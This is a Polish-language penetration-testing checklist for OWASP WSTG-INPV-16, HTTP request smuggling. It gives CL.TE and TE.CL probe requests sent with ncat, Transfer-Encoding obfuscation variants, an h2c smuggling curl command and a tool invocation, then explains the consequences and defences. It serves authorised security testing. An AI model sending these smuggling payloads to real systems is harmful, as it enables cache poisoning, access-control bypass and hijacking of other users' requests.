# WSTG-INPV-16 — Testing for HTTP Request Smuggling

## Cele

- Identify request boundary inconsistencies between frontend and backend
- Detect classic CL/TE desynchronization vulnerabilities

## KOMENDY

### smuggler.py

```bash
python3 smuggler.py -u "https://TARGET/"

```

### Reczne testowanie CL.TE

```bash
printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG' | ncat TARGET 443 --ssl

```

### Reczne testowanie TE.CL

```bash
printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nG\r\n0\r\n\r\n' | ncat TARGET 443 --ssl

```

### Testowanie TE.TE (obfuskacja)

```bash
# Transfer-Encoding: chunked
# Transfer-Encoding: xchunked
# Transfer-Encoding : chunked
# Transfer-Encoding: chunked\r\nTransfer-Encoding: x

```

### h2c smuggling

```bash
curl --http2 -X PRI "https://TARGET/" -H "Upgrade: h2c"

```

## KOMENDY Z WORDLISTAMI

### PayloadsAllTheThings Request Smuggling

```bash
# Referencja: Desktop/WSTG/PayloadsAllTheThings-master/Request Smuggling/README.md

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Uzyj Burp HTTP Request Smuggler extension
2. Testuj CL.TE, TE.CL i TE.TE warianty
3. Monitoruj odpowiedzi pod katem desynchronizacji
4. Testuj HTTP/2 downgrade attacks
5. Sprawdz czy mozna zatruć cache przez smuggling
6. Uzyj Burp Turbo Intruder do zaawansowanych testow


---

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — HTTP_Strict_Transport_Security_Cheat_Sheet.md, REST_Security_Cheat_Sheet.md

### HTTP Request Smuggling — mechanizm

- Exploituje **roznice w parsowaniu** dlugosci requestu miedzy frontend (proxy/LB) a backend
- Frontend i backend nie zgadzaja sie gdzie konczy sie jeden request a zaczyna nastepny
- Skutek: atakujacy **przemyca** czesc swojego requestu do requestu innego uzytkownika

### Typy atakow

| Typ | Frontend czyta | Backend czyta | Opis |
|-----|---------------|---------------|------|
| CL.TE | Content-Length | Transfer-Encoding | Frontend ufa CL, backend przetwarza chunked |
| TE.CL | Transfer-Encoding | Content-Length | Frontend przetwarza chunked, backend ufa CL |
| TE.TE | Transfer-Encoding (wariant 1) | Transfer-Encoding (wariant 2) | Obfuskacja jednego z TE headers |

### Konsekwencje

- **Bypass zabezpieczen**: ominięcie WAF, kontroli dostepu na froncie
- **Cache poisoning**: zatrute response cachowane dla innych uzytkownikow
- **Credential hijacking**: przechwycenie requestu innego uzytkownika (cookies, auth headers)
- **Request routing**: przekierowanie requestu do innego backendu
- **Web cache deception**: serwer cachuje wrazliwe dane innego uzytkownika

### Obfuskacja Transfer-Encoding (TE.TE bypass)

- `Transfer-Encoding: xchunked`
- `Transfer-Encoding : chunked` (spacja przed dwukropkiem)
- `Transfer-Encoding: chunked` + `Transfer-Encoding: x`
- `Transfer-Encoding: chunked\r\n\t` (tab po CRLF)
- `X: x\r\nTransfer-Encoding: chunked` (line folding)

### Obrona

- Uzyj **HTTP/2** end-to-end — eliminuje desynchronizacje (ale sprawdz H2C smuggling)
- Nie mieszaj Content-Length i Transfer-Encoding — odrzucaj takie requesty
- Normalizuj naglowki na frontend proxy — usun niejednoznaczne TE headers
- Ustaw frontend i backend na **takie same reguły parsowania**
- Monitoruj anomalie: rozne dlugosci response, nieoczekiwane 400/500 odpowiedzi

## ROZSZERZENIA BURP SUITE

| Rozszerzenie | Opis | Link |
|---|---|---|
| Collaborator Everywhere | Wstrzykiwanie naglowkow do odkrywania backendow przez pingbacki | [GitHub](https://github.com/PortSwigger/collaborator-everywhere) |
